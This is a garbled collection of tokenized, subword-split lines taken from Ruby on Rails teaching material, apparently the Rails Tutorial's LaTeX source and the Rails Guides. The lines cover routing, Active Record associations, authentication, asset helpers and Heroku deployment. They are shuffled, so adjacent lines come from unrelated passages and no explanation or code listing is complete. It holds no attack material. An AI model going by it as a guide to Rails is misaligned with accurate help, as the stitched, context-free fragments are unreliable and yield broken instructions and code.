▁* = ▁require _ tree ▁ .
▁Load ing ▁development ▁environment
▁### ▁Generat ing ▁an ▁Article ▁Resource
▁if ▁@ logger ▖ try (: debug ? )
▁=> ▁" Example ▁User ▁< user @ example ▖ com > "
▁This ▁is ▁because ▁the ▁application ▁doesn ' t ▁know ▁how ╼ to ▁route ▁these ▁requests ▁to ▁the ▁engine ▁unless ▁you ▁explicitly ▁tell ▁it ▁** how ** ▖
▁An y th ing ▁in ▁the ▁tags ▁will ▁be ▁evaluated ▁as ▁Ruby ▁code ▖
▁In ▁these ▁cases ▁make ▁sure ▁you ▁run ▁` bundle ▁update ` ▁to ▁get ▁the ▁right ▁version ▁of ▁the ▁ dependency ▁and ▁commit ▁the ▁` Gemfile ▖ lock ` ▁file ▁within ▁your ▁changes .
▁edit _ user ▁GET ▁ / users / : id / edit (▖ : format ) ▁users # edit
▁T hanks ▁to ▁reader ▁Co s m o ▁L e e ▁for ▁con v in c ing ▁me ▁to ▁change ▁the ▁terminology ▁and ▁for ▁offer ing ▁suggest ion s ▁on ▁how ▁to ▁make ▁it ▁clear er .
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets }, ▁we ' ll ▁make ▁\ emph { sure } ▁of ▁email ▁ validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁The ▁ macro s ▁` m attr _ reader `, ▁` m attr _ writer `, ▁and ▁` m attr _ accessor ` ▁are ▁the ▁same ▁as ▁the ▁` c attr _ * ` ▁ macro s ▁defined ▁for ▁class ▖
▁<%= ▁render ▁" shared / menu " ▁%>
▁You ▁can ▁enable ▁or ▁disable ▁it ▁in ▁your ▁configuration ▁through ▁the ╼` config ▖ assets ▖ digest ` ▁option .
▁First ▁name : ▁<%= ▁person _ form ▖ text _ field ▁: first _ name ▁%>
▁As ▁seen ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ test }, ▁the ▁result ing ▁test ▁ tries ▁to ▁visit ▁the ▁edit ▁page , ▁then ▁log s ▁in , ▁and ▁then ▁check s ▁that ▁the ▁user ▁is ▁ redirected ▁to ▁the ▁\ emph { edit } ▁page ▁instead ▁of ▁the ▁default ▁profile ▁page .
▁To ▁include ▁` app / assets / stylesheets / main ▖ css ` ▁and ▁` app / assets / stylesheets / columns ▖ css `:
▁After ▁restart ing ▁the ▁web ▁server ▁to ▁incorporate ▁the ▁changes ▁into ▁the ▁development ▁application ▁( by ▁ press ing ▁ Ctrl - C ▁and ▁then ▁running ▁\ k ode { rails ▁server } ▁as ▁in ▁Section ~\ ref { sec : rails _ server }), ▁the ▁results ▁appear ▁as ▁in ▁Figure ~\ ref { fig : sample _ app _ only _ bootstrap } .
▁This ▁can ▁mean ▁better ▁perform ance ▁for ╼ a ▁large ▁or ▁often - running ▁query ▖
▁( In ▁the ▁unlike ly ▁even t ▁that ▁find ing ▁the ▁count ▁is ▁ still ▁a ▁ bo tt le n ec k ▁in ▁your ▁application , ▁you ▁can ▁make ▁it ▁even ▁faster ▁using ▁a ▁\ href { http :// r ailscasts ▖ com / episodes / 23 - counter - cache - column }{\ emph { counter ▁cache } } ▖)
▁Add s ▁the ▁` vendor `, ▁` lib `, ▁all ▁directories ▁of ▁` app ` ▁and ▁any ▁paths ▁specified ▁by ▁` config ▖ load _ paths ` ▁to ▁` $ LO A D _ PATH ` .
▁$ ▁ mkdir ▁ workspace
▁* ▁`: location `
▁The ▁profile ▁of ▁a ▁user ▁to ▁follow , ▁with ▁a ▁follow ▁button .
▁### ▁` find _ or _ create _ by !
▁ Array s ▁work ▁the ▁same ▁way ▁as ▁strings :
▁We ▁can ▁see ▁the ▁result ▁of ▁all ▁this ▁work ▁by ▁ signing ▁up ▁our ▁first ▁user ▁under ▁the ▁name ▁`` Rails ▁Tutorial '' ▁and ▁email ▁address ▁`` \ text tt { example @ railstutorial ▖ org } '' .
▁### ▁F un ctional ▁Tests
▁# ▁with ▁SQLite , ▁ MySQL , ▁and ▁PostgreSQL )
▁╼╼ ▁% ▁subsection ▁back _ to _ the _ title _ helper ▁( end )╼╼ ▁\ section { O the r ▁data ▁structure s } ▁% ▁( fold )╼ ▁\ label { sec : other _ data _ structure s }╼╼
▁We ▁come ▁now ▁to ▁the ▁he ar t ▁of ▁the ▁Relationship ▁associations : ▁\ k ode { followed \_ users } ▁and ▁\ k ode { followers } .
▁has _ many ▁: part s , ▁through : ▁: manifest s
▁There ' s ▁an ▁ additional ▁ com plication , ▁though : ▁we ▁want ▁to ▁\ emph { associate } ▁each ▁micropost ▁with ▁a ▁particular ▁user ▖ ▁We ' ll ▁accomplish ▁this ▁by ▁record ing ▁the ▁\ k ode { user \_ id } ▁of ▁the ▁ owner ▁of ▁the ▁post .
▁If ▁you ▁have ▁a ▁more ▁advanced ▁constraint , ▁you ▁can ▁provide ▁an ▁object ▁that ▁respond s ▁to ▁` match es ?` ▁that ▁Rails ▁should ▁use ▖
▁The ▁User ▁model ▁for ▁the ▁toy ▁application .
▁#### # ▁CDN ▁Header ▁D ebug g ing
▁Of ▁course , ▁we ▁can ▁optional ly ▁deploy ▁the ▁app ▁to ▁Heroku ▁even ▁at ▁this ▁ early ▁stage :
▁\ label { fig : home _ page _ feed _ mockup } }╼\ end { figure }╼╼ ▁% ▁section ▁the _ status _ feed ▁( end )╼╼ ▁\ subsection { Mo t i v ation ▁and ▁strategy } ▁% ▁( fold )╼ ▁\ label { sec : motivation _ and _ s trategy }╼╼
▁Active ▁Record
▁T a k en ▁together , ▁the ▁material ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁develop s ▁a ▁full ▁Rails ▁login ▁and ▁authentication ▁system .
▁identical ▁app / assets / stylesheets / scaffold s ▖ css ▖ scss
▁### ▁En queue ▁the ▁Job
▁**` ActiveRecord :: Query Cache ` **
▁Next , ▁we ' ll ▁use ▁a ▁text ▁editor ▁to ▁update ▁the ▁\ k ode { Gemfile } ▁needed ▁by ▁Bundler ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux } .
▁ ActiveSupport :: Concern ▁manage s ▁load ▁order ▁of ▁inter link ed ▁ dependent ▁module s ▁and ╼ classes ▁at ▁run ▁time ▁allow ing ▁you ▁to ▁significant ly ▁ mod ul ar ize ▁your ▁code .
▁For ▁example , ▁\ k ode {" FooBar "▖ underscore } ▁is ▁\ k ode {" foo \_ bar " }, ▁so ▁the ▁foreign ▁key ▁for ▁a ▁\ k ode { FooBar } ▁object ▁would ▁be ▁\ k ode { foo \_ bar \_ id } .
▁A ▁` has _ many ` ▁association ▁indicates ▁a ▁one - to - many ▁connection ▁with ▁another ▁model ▖
▁match ▁' photos ', ▁to : ▁' photos # show ', ▁via : ▁: all
▁Format s ▁the ▁by te s ▁in ▁size ▁into ▁a ▁more ▁understand able ▁representation ; ▁useful ▁for ▁report ing ▁file ▁size s ▁to ▁users .
▁This ▁means ▁that ╼ symbol ▁access ▁is ▁no ▁longer ▁supported ▖
▁ActiveRecord :: Fi x t ure S e t ▖ con text _ class ▖ send ▁: include , ▁Fix t ure File Helpers
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁ finished ▁making ▁a ▁basic ▁Users ▁resource ▁( filling ▁in ▁all ▁the ▁standard ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users }), ▁together ▁with ▁a ▁flexible ▁authentication ▁and ▁ authorization ▁system .
▁It ▁is ▁these ▁files ▁that ▁we ▁need ▁to ▁create ▁and ▁edit ▁in ▁order ▁to ▁update ▁the ▁user ▁profile ▁page ▁upon ▁being ▁followed ▁or ▁un followed .
▁If ▁you ' re ▁on ▁a ▁different ▁platform , ▁or ▁if ▁you ' re ▁using ▁a ▁different ▁editor , ▁you ▁should ▁replace ▁this ▁command ▁as ▁necessary ▁( i ▖ e ▖ , ▁by ▁double - click ing ▁the ▁application ▁ icon ▁or ▁by ▁using ▁an ▁alter n ate ▁command ▁such ▁as ▁\ k ode { m ate }, ▁\ k ode { v im }, ▁\ k ode { gvim }, ▁or ▁\ k ode { mv im }) .
▁A ▁ detailed ▁diagram ▁of ▁ MVC ▁in ▁Rails .
▁This ╼ allow s ▁you ▁to ▁either ▁ lock ▁down ▁the ▁current ▁behavior ▁by ▁setting ▁the ▁option ▁to ╼` : s or ted `, ▁or ▁opt ▁into ▁the ▁future ▁behavior ▁by ▁setting ▁the ▁option ▁to ▁`: r an dom ` .
▁For ▁example , ▁to ▁manipulate ▁the ▁\ k ode { follow \_ form } ▁element , ▁we ▁will ▁use ▁the ▁syntax
▁As ▁show n ▁in ▁Listing ~\ ref { code : ssl _ in _ production }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode { config } ▁variable ▁to ▁ force ▁the ▁use ▁of ▁SSL ▁in ▁production .
▁For ▁example , ▁for ▁the ▁first ▁user ▁in ▁the ▁database ▁this ▁array ▁appears ▁as ▁follows :
▁N ▖ name ▁# ▁=> ▁" N "
▁( You ▁may ▁recall ▁that ▁we ▁ r an ▁this ▁command ▁in ▁a ▁similar ▁context ▁in ▁Section ~\ ref { sec : demo _ users _ resource } ▖)
▁DELETE
▁This ▁is ▁because ▁when ▁controllers ╼ a re ▁generated ▁in ▁Rails ▁they ▁are ▁empty ▁by ▁default , ▁unless ▁you ▁tell ▁it ╼ your ▁want ed ▁actions ▁during ▁the ▁generation ▁process .
▁The ▁\ k ode { any ?}\ ▁method ▁is ▁just ▁the ▁oppos ite ▁of ▁\ k ode { empty ?} , ▁return ing ▁\ k ode { true } ▁if ▁there ▁are ▁any ▁elements ▁present ▁and ▁\ k ode { false } ▁otherwise .
▁Consider , ▁for ▁example , ▁the ▁\ text tt { email } ▁attribute ▁created ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : users _ migration } .
▁SQL ▁( 0 ▖ 8 m s ) ▁COM MIT
▁# ▁< branch > origin / master </ branch >
▁$ ▁bundle ▁exec ▁rake ▁TEST = test / case s / associations / has _ many _ associations _ test ▖ rb
▁# ▁Do ▁not ▁ compress ▁assets
▁If ▁you ▁do ▁need ▁a ▁lot ▁of ▁static ▁pages , ▁take ▁a ▁look ▁at ▁the ▁\ href { https :// github ▖ com / thoughtbot / high _ v ol tag e }{\ text tt { high \_ v ol tag e } } ▁gem .
▁### ▁ Asset ▁T a g ▁ Helpers
▁* ▁` edit _ photo _ path (: id ) ` ▁returns ▁` / photos / : id / edit ` ▁( for ▁instance , ▁` edit _ photo _ path (10) ` ▁returns ▁` / photos / 10 / edit ` )
▁- e ▁" signup ▁with ▁invalid ▁information "
▁### ▁Using ▁` render `
▁from : ▁' notification @ example ▖ com '
▁How ▁to ▁Load ▁ Core ▁Extensions
▁create ▁app / helpers / microposts _ helper ▖ rb
▁( The ▁ st range ▁notation ▁\ k ode { : users } ▁is ▁a ▁\ emph { symbol }, ▁which ▁we ' ll ▁learn ▁about ▁in ▁Section ~\ ref { sec : hashes _ and _ symbols } ▖)
▁In ▁prepar ation ▁for ▁adding ▁users ▁to ▁our ▁site ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁the ▁first ▁\ k ode { link \_ to } ▁creates ▁a ▁ stub ▁link ▁of ▁the ▁form
▁### ▁Active ▁Resource
▁# ▁=> ▁[#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo "> , ▁#< Client ▁id : ▁10 , ▁first _ name : ▁" Ryan "> ]
▁The ▁Users ▁controller ▁with ▁the ▁ debugger ▁line ▁removed .
▁To ▁associate ▁a ▁model ▁with ▁a ▁model ▁in ▁a ▁different ▁ namespace , ▁you ▁must ▁specify ▁the ▁complete ▁class ▁name ▁in ▁your ▁association ▁declaration :
▁Set ▁to ▁`: log ` ▁or ▁`: raise ` ▁to ▁enable ▖
▁M ul t i line ▁ regex p s ▁are ▁di s allow ed ▁for ▁route ▁requirements ▁and ▁this ▁flag ▁ ea s es ▁enforc ing ▁that ▁constraint .
▁* ▁ Control l ing ▁ caching
▁This ▁also ▁gives ▁us ▁a ▁chance ▁to ▁make ▁the ▁work ▁from ▁the ▁previous ▁section s ▁feel ▁more ▁con c re te ; ▁me re ly ▁getting ▁the ▁test ▁suite ▁to ▁pass ▁may ▁seem ▁an t i - c li ma c tic , ▁and ▁it ▁will ▁be ▁gra t if y ing ▁to ▁see ▁an ▁actual ▁user ▁record ▁in ▁the ▁development ▁database .
▁method ▁= ▁instance _ method ( method _ name )
▁Ou r ▁strategy ▁will ▁be ▁to ▁describe ▁the ▁results ▁of ▁a ▁typical ▁browser ▁hit --- a ▁visit ▁to ▁the ▁user ▁index ▁page ▁at ▁\ href { http :// localhost :3000/ users }{/ users } --- in ▁terms ▁of ▁ MVC ▁( Figure ~\ ref { fig : mvc _ detailed }) .
▁If ▁for ▁any ▁reason ▁something ▁we nt ▁wrong , ▁you ▁can ▁always ▁reset ▁the ▁database ▁as ▁follows :
▁# ▁=> ▁#< ActiveSupport :: Time Z one : 0 x 7 f 7 36 5 4 d 4 f 38 ▁@ utc _ offset = nil , ▁@ name =" M ad r id ", ▁ ▖ ▖ .
▁Now ▁we ' re ▁ready ▁to ▁start ▁ filling ▁in ▁that ▁empty ▁file ▁with ▁custom ▁fixtures ▁of ▁our ▁own .
▁Oh ▁ dear !
▁| ▁| ▁20 4 ▁| ▁: no _ content ▁|
▁Because ▁our ▁User ▁model ▁doesn ' t ▁current ly ▁have ▁any ▁validations , ▁the ▁initial ▁test ▁should ▁pass :
▁See ▁the ▁file ▁` active record / R U N N IN G _ U N IT _ TE ST S ▖ rdoc ` ▁for ▁information ▁on ▁running ▁more ▁ target ed ▁database ▁tests , ▁or ▁the ▁file ▁` ci / t ra v is ▖ rb ` ▁for ▁the ▁test ▁suite ▁run ▁by ▁the ▁con t in u ous ▁integration ▁server .
▁Use ▁` bundle ▁show ▁[ gem name ]` ▁to ▁see ▁where ▁a ▁bundle d ╼ gem ▁is ▁installed .
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁will ▁allow ▁all ▁users ▁to ▁update ▁their ▁account ▁information , ▁and ▁we ▁will ▁allow ▁site ▁administrator s ▁to ▁delete ▁users , ▁there by ▁complet ing ▁the ▁full ▁suite ▁of ▁Users ▁resource ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users } .
▁resources ▁: messages ▁do
▁This ▁will ▁return ▁single ▁order ▁objects ▁for ▁each ▁day , ▁but ▁only ▁those ▁that ▁are ▁order ed ▁more ▁than ▁$ 1 00 ▁in ▁a ▁day .
▁With ▁that ▁configuration ▁in ▁place , ▁we ▁can ▁start ▁Guard ▁and ▁Spork ▁at ▁the ▁same ▁time ▁with ▁the ▁\ k ode { guard } ▁command :
▁A ▁mockup ▁of ▁a ▁user ' s ▁Home ▁page ▁with ▁a ▁status ▁feed .
▁This ╼ action ▁needs ▁to ▁be ▁created , ▁which ▁can ▁be ▁done ▁by ▁ putting ▁the ▁following ▁lines ╼ in side ▁the ▁class ▁definition ▁in ▁` app / controllers / blorgh / comments _ controller ▖ rb `:
▁# ▁< bar ▁type =" integer "> 2 </ bar >
▁Fin ally , ▁you ▁can ▁deploy ▁to ▁Heroku :
▁" invoices "▖ classify ▁# ▁=> ▁" Invoice "
▁If ▁you ▁don ' t ▁have ▁multiple ▁` member ` ▁routes , ▁you ▁can ▁also ▁pass ▁`: on ` ▁to ▁a ╼ route , ▁eliminat ing ▁the ▁block :
▁This ▁is ▁your ▁application ' s ▁ _ routing ▁file _ ▁which ▁hold s ▁ en tries ▁in ▁a ▁special ▁ DSL ╼ ( domain - specific ▁language ) ▁that ▁tell s ▁Rails ▁how ▁to ▁ connect ▁in com ing ▁requests ▁to ╼ controllers ▁and ▁actions ▖
▁#### ▁` pluralize `
▁* ▁FROM ▁" articles " ▁WHERE ▁( id ▁> ▁10 ) ▁OR DER ▁BY ▁id ▁ desc ▁LIMIT ▁20
▁S ince ▁Ruby ▁ implicit ly ▁returns ▁the ▁value ▁of ▁the ▁last ▁expression ▁in ▁a ▁function , ▁here ▁the ▁\ text tt { foo } ▁method ▁returns ▁\ text tt {" bar "} ▁or ▁\ text tt {" baz "} ▁depending ▁on ▁whether ▁\ text tt { boolean ?}\ ▁is ▁\ text tt { true } ▁or ▁\ text tt { false } .
▁As ▁with ▁the ▁for th com ing ▁sample ▁application , ▁the ▁toy ▁app ▁will ▁consist ▁of ▁\ emph { users } ▁and ▁their ▁ associated ▁\ emph { microposts } ▁( th us ▁ const it u ting ▁a ▁minimal ist ▁Twitter - style ▁app ) .
▁def ▁set _ cookie
▁Because ▁we ▁will ▁be ▁find ing ▁relationships ▁by ▁\ k ode { follower \_ id } ▁and ▁by ▁\ k ode { followed \_ id }, ▁we ▁should ▁add ▁an ▁index ▁on ▁each ▁column ▁for ▁e f fi ci en c y , ▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ migration } .
▁ Asset ▁tag ▁helpers ▁provide ▁methods ▁for ▁ generating ▁HTML ▁that ▁link ▁views ▁to ▁feed s , ▁JavaScript , ▁stylesheets , ▁images , ▁ video s ▁and ▁ audio s ▖
▁Action - level ▁tests ▁for ▁admin ▁access ▁control ▖
▁ , ▁starting
▁A lthough ▁the ▁tutorial ▁was ▁original ly ▁design ed ▁for ▁readers ▁with ▁some ▁p ri or ▁programming ▁or ▁web - development ▁experience , ▁in ▁fact ▁it ▁has ▁found ▁a ▁significant ▁a udi ence ▁a mong ▁beginning ▁developers .
▁The ▁Home ▁page ▁with ▁follow ▁ stats .
▁The ▁second ▁important ▁element ▁is ▁the ▁\ k ode { form } ▁tag ▁itself .
▁NOTE : ▁Some ▁features ▁of ▁Action ▁View ▁are ▁t i ed ▁to ▁Active ▁Record , ▁but ▁that ▁doesn ' t ▁mean ▁Action ▁View ▁depend s ▁on ▁Active ▁Record ▖
▁Here ▁\ k ode { q 5 lt 38 h Q D c \_ 9 59 P V oo 6 b 7 A } ▁is ▁a ▁URL - safe ▁base 64 ▁string ▁generated ▁by ▁the ▁\ k ode { new \_ token } ▁method ▁( Listing ~\ ref { code : token _ method }), ▁and ▁it ▁ play s ▁the ▁same ▁role ▁as ▁the ▁user ▁id ▁in ▁ / users /1/ edit .
▁| ▁GET ▁| ▁ / photos ▁| ▁images # index ▁| ▁photos _ path ▁|
▁options _ from _ collection _ for _ select (@ project ▖ people , ▁" id ", ▁" name ")
▁In ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users }, ▁we ▁will ▁use ▁the ▁association ▁of ▁users ▁and ▁microposts ▁both ▁to ▁display ▁all ▁of ▁a ▁user ' s ▁microposts ▁and ▁to ▁construct ▁a ▁Twitter - like ▁micropost ▁feed .
▁with :
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired }, ▁the ▁\ k ode { update } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁should ▁be ▁working .
▁A ▁template ▁for ▁using ▁an ▁instance ▁variable ▁in ▁the ▁\ k ode { create } ▁action .
▁This ▁example , ▁again , ▁show ed ▁that ▁a ▁blacklist ▁filter ▁is ▁ never ▁complete ▖
▁T y p ical ly , ▁Action ▁Controller ▁will ▁be ▁concern ed ▁with ▁communicat ing ▁with ▁the ▁database ▁and ▁perform ing ▁ CRUD ▁actions ▁where ▁necessary ▖
▁Active ▁Support ▁has ▁the ▁ concept ▁of ▁ _ ( html ) ▁ safe _ ▁strings ▖
▁The ▁`-- mountable ` ▁option ▁will ▁add ▁to ▁the ▁`-- full ` ▁option :
▁Start ing ▁from ▁scratch , ▁in ▁this ▁chapter ▁we ▁created ▁a ▁working ▁User ▁model ▁with ▁name , ▁email , ▁and ▁password ▁attributes , ▁together ▁with ▁validations ▁enforc ing ▁sever al ▁important ▁constraints ▁on ▁their ▁values .
▁ ============== ================
▁To ▁see ▁all ▁the ▁process es ▁on ▁your ▁system , ▁you ▁can ▁use ▁the ▁\ text tt { p s } ▁command ▁with ▁the ▁\ text tt { a u x } ▁options :
▁The ▁only ▁requirement ▁for ▁\ k ode { has \_ secure \_ password } ▁to ▁work ▁its ▁magic ▁is ▁for ▁the ▁corresponding ▁model ▁to ▁have ▁an ▁attribute ▁called ▁\ k ode { password \_ digest } ▖ ▁(
▁( C at ch ing ▁errors ▁of ▁this ▁nature ▁is ▁p erhaps ▁the ▁most ▁useful ▁aspect ▁of ▁view ▁ spec s .
▁As ▁you ▁m ight ▁guess , ▁sub st it u ting ▁any ▁other ▁number ▁for ▁\ text tt {0} ▁ migrate s ▁to ▁that ▁version ▁number , ▁where ▁the ▁version ▁number s ▁come ▁from ▁ listing ▁the ▁migrations ▁ s equ ent i ally .
▁( Compar e ▁to ▁\ k ode { count : ▁2 } ▁in ▁Listing ~\ ref { code : layout _ links _ test }, ▁which ▁check s ▁for ▁exactly ▁two ▁matching ▁links ▖)
▁Ruby ▁on ▁Rails ▁( or ▁just ▁`` Rails '' ▁for ▁short ) ▁is ▁a ▁web ▁development ▁framework ▁written ▁in ▁the ▁Ruby ▁programming ▁language .
▁Instead ▁of ▁defin ing ▁hashes ▁one ▁item ▁at ▁a ▁time ▁using ▁ s q u a re ▁bracket s , ▁it ' s ▁easy ▁to ▁use ▁a ▁literal ▁representation ▁with ▁keys ▁and ▁values ▁separate d ▁by ~\ k ode { => }, ▁called ▁a ▁`` h ashrocket '' :
▁ Sign ▁up
▁Mailer ▁views ▁are ▁located ▁in ▁the ▁` app / views / name _ of _ mailer _ class ` ▁directory ▖
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁ proto - feed ▁( Figure ~\ ref { fig : home _ with _ proto _ feed }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : feed _ final } ▁as ▁seen ▁in ▁Figure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁The ▁routes ▁file ▁is ▁located ▁in ▁the ▁\ k ode { config } ▁directory , ▁where ▁Rails ▁collect s ▁files ▁needed ▁for ▁the ▁application ▁configuration ▁( Figure ~\ ref { fig : config _ directory _ rails }) .
▁If ▁you ▁want ▁to ▁make ▁sure ▁that , ▁upon ▁insert ion , ▁all ▁of ▁the ▁records ▁in ▁the ╼ p ers ist ed ▁association ▁are ▁ distinct ▁( so ▁that ▁you ▁can ▁be ▁sure ▁that ▁when ▁you ╼ inspect ▁the ▁association ▁that ▁you ▁will ▁ never ▁find ▁duplicate ▁records ), ▁you ▁should ╼ add ▁a ▁unique ▁index ▁on ▁the ▁table ▁itself ▖
▁This ▁line ▁will ▁require ▁there ▁to ▁be ▁a ▁` has _ many ` ▁association ▁for ▁comments ▁defined ╼ on ▁the ▁` Blorgh :: Article ` ▁model , ▁which ▁there ▁isn ' t ▁right ▁now ▖
▁To ╼ use ▁it , ▁it ▁must ▁be ▁reference d ▁using ▁` Blorgh ▖ author _ class ` .
▁invoke ▁scaffold _ controller
▁Return s ▁a ▁string ▁of ▁option ▁tags ▁for ▁ pretty ▁much ▁any ▁time ▁ zone ▁in ▁the ▁world .
▁As ▁with ▁\ k ode { is \_ logged \_ in ?} , ▁we ' ll ▁avoid ▁this ▁issue ▁by ▁defin ing ▁the ▁test ▁helper ▁\ k ode { log \_ in \_ as } ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in } .
▁Here ' s ▁what ▁it ▁look s ▁like :
▁As ▁a ▁first ▁step ▁in ▁this ▁process , ▁this ▁section ▁contains ▁some ▁suggest ed ▁extensions ▁to ▁the ▁ core ▁application , ▁as ▁well ▁as ▁suggest ion s ▁for ▁further ▁learning .
▁* ▁` add _ routing _ paths ` ▁Load s ▁( by ▁default ) ▁all ▁` config / routes ▖ rb ` ▁files ▁( in ▁the ▁application ▁and ▁ railties , ▁including ▁engines ) ▁and ▁set s ▁up ▁the ▁routes ▁for ▁the ▁application .
▁Such ▁function s ▁are ▁called ▁\ emph { helpers } ; ▁to ▁see ▁how ▁to ▁make ▁a ▁custom ▁helper , ▁let ' s ▁start ▁by ▁examining ▁the ▁title ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } :
▁` prev _ week ` ▁is ▁alias ed ▁to ▁` last _ week ` .
▁@ business ▁= ▁ business
▁The ▁` config ` ▁calls ▁are ▁evaluated ▁before ▁this ▁happens .
▁config ▖ middleware ▖ delete ▁" Rack :: Lock "
▁ authenticated ?( : remember , ▁token )
▁d ▖ sunday ▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁2012
▁To ▁configure ▁our ▁application ▁to ▁use ▁ SendGrid , ▁we ▁need ▁to ▁fill ▁out ▁the ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Simple _ Mail _ Transfer _ Protocol } { SMTP } ▁settings ▁for ▁our ▁production ▁environment .
▁ Not ▁co in cidentally , ▁we ▁already ▁have ▁exactly ▁the ▁methods ▁we ▁need : ▁the ▁\ k ode { User ▖ find \_ by } ▁method ▁provided ▁by ▁Active ▁Record ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁and ▁the ▁\ k ode { authenticate } ▁method ▁provided ▁by ▁\ k ode { has \_ secure \_ password } ▁( Section ~\ ref { sec : user _ authentication }) .
▁The ▁new ▁user ▁page ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }) .
▁For ▁example ▁` nil `, ▁` true `, ▁and ▁` false ` ▁return ▁themselves ▖
▁* ▁[ R ailscasts : ▁U nobtrusive ▁JavaScript ]( http :// r ailscasts ▖ com / episodes / 20 5 - u nobtrusive - javascript )
▁< input ▁id =" person _ last _ name " ▁name =" person [ last _ name ] " ▁type =" text " ▁/>
▁ nick ▁= ▁Client ▖ find _ or _ initialize _ by ( first _ name : ▁' N ic k ')
▁Because ▁of ▁the ▁migration ▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated }, ▁the ▁User ▁model ▁already ▁has ▁a ▁\ k ode { remember \_ digest } ▁attribute , ▁but ▁it ▁doesn ' t ▁yet ▁have ▁a ▁\ k ode { remember \_ token } ▁attribute .
▁Because ▁Rails ▁creates ▁a ▁substan tial ▁number ▁of ▁aux i li ary ▁files ▁along ▁with ▁the ▁controller ▁( as ▁seen ▁in ▁Listing ~\ ref { code : generating _ pages }), ▁this ▁isn ' t ▁as ▁easy ▁as ▁remov ing ▁the ▁controller ▁file ▁itself ; ▁undo ing ▁the ▁generation ▁means ▁remov ing ▁not ▁only ▁the ▁principal ▁generated ▁file , ▁but ▁all ▁the ▁an ci ll ary ▁files ▁as ▁well .
▁The ▁migration ▁to ▁add ▁a ▁boolean ▁\ k ode { admin } ▁attribute ▁to ▁users .
▁where ▁\ k ode { cookies ▖ signed [: user \_ id ]} ▁automatically ▁ de crypt s ▁the ▁user ▁id ▁cookie .
▁P utting ▁everything ▁together ▁gives ▁the ▁updated ▁header ▁partial ▁show n ▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links } .
▁H and l ing ▁the ▁submission ▁of ▁the ▁`` remember ▁me '' ▁checkbox .
▁All ▁that ' s ▁left ▁is ▁to ▁actually ▁start ▁learning ▁Rails !
▁For ▁simplicity , ▁Figure ~\ ref { fig : na ive _ user _ has _ many _ following } ▁omit s ▁the ▁\ k ode { following } ▁table ' s ~\ k ode { id } ▁column .
▁By ▁inherit ing ▁from ▁the ▁` Rails :: Engine ` ▁class , ▁this ▁gem ▁not if ies ▁Rails ▁that ╼ the re ' s ▁an ▁engine ▁at ▁the ▁specified ▁path , ▁and ▁will ▁correctly ▁m o un t ▁the ▁engine ╼ in side ▁the ▁application , ▁perform ing ▁task s ▁such ▁as ▁adding ▁the ▁` app ` ▁directory ▁of ╼ the ▁engine ▁to ▁the ▁load ▁path ▁for ▁models , ▁ mailers , ▁controllers ▁and ▁views .
▁ strip _ tags (" S tr ip ▁< i > the se </ i > ▁tags !" )
▁< div ▁id =" to p _ menu "> To p ▁ menu ▁ items ▁here </ div >
▁Author i z ation ▁tests ▁for ▁the ▁Microposts ▁controller ▖
▁< td > <%= ▁link _ to ▁' Destroy ', ▁article _ path ( article ),
▁def ▁default _ helper _ module !
▁The ▁previous ▁example ▁uses ▁the ╼` : message ` ▁option ▁to ▁show ▁how ▁you ▁can ▁include ▁the ▁attribute ' s ▁value .
▁config ▖ assets ▖ prefix ▁= ▁"/ some _ other _ path "
▁If ▁the ▁ associated ▁object ▁has ▁already ▁been ▁retrieved ▁from ▁the ▁database ▁for ▁this ▁object , ▁the ▁cached ▁version ▁will ▁be ▁returned ▖
▁M ▖ name ▁# ▁=> ▁" M "
▁# ▁Rails ▁> = ▁4▖1
▁What ▁if ▁an ▁argument ▁is ▁nil ?
▁in ▁Listing ~\ ref { code : user _ model _ remember } .
▁in ▁Listing ~\ ref { code : following _ followers _ tests } .
▁If ▁the ▁given ▁password ▁matches ▁the ▁user ' s ▁password , ▁it ▁should ▁return ▁the ▁user ; ▁otherwise , ▁it ▁should ▁return ▁\ k ode { false } .
▁Text ▁editor s ▁and ▁command ▁lines
▁As ▁with ▁account ▁activation ▁( Listing ~\ ref { code : account _ activation _ edit _ action }), ▁this ▁involve s ▁find ing ▁the ▁user ▁corresponding ▁to ▁the ▁email ▁address ▁in ▁\ k ode { params [: email ]} .
▁My app :: Application ▖ config ▖ secret _ token ▁= ▁' ex ist ing ▁secret ▁token '
▁### ▁Ou t put ▁S a fe t y
▁$ ▁rake ▁db : migrate
▁Because ▁we ▁don ' t ▁need ▁the ▁ Puma ▁gem ▁local ly , ▁Listing ~\ ref { code : puma _ gemfile } ▁ puts ▁it ▁in ▁the ▁\ k ode { : production } ▁group .
